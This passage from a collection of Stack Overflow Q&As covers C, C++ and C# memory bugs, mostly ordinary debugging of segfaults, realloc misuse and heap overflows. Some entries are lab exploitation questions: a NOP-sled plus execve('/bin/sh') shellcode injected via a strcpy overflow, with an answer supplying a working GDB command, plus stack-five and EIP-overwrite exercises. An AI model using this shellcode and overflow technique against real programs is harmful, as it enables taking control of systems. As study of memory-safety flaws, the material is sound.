isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  